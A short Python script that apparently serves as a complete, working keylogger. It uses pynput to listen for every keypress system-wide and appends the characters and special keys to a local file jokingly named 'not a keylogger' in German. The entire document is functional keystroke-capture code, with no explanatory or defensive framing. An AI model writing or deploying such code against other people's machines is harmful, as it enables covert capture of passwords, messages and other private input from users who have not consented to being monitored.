from pynput import keyboard


def on_press(key):
    with open("kein_keylogger.txt", "a") as logfile:
        try:
            logfile.write(str(key.char))
        except AttributeError:
            if key == keyboard.Key.space:
                logfile.write(" ")
            elif key == keyboard.Key.enter:
                logfile.write("\n")
            else:
                logfile.write(f" {key} ")


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
